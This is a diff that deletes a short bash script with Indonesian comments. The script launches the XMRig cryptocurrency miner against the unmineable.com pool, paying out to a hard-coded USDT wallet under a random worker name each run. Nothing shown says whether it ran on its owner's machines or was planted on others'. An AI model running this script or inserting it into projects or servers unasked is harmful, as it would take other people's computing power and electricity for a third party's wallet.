@@ -1,9 +1,0 @@
-#!/bin/bash
-
-chmod +x xmrig
-
-# Generate random 6 karakter huruf/angka
-WORKER=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 6)
-
-# Jalankan XMRig dengan worker acak
-./xmrig -o rx.unmineable.com:3333 -a rx -u USDT:TGyzmwUbkuXMf7q7HQaiwGG826ag7TBTTs.$WORKER#v18h-veu8 -p x --donate-level 0
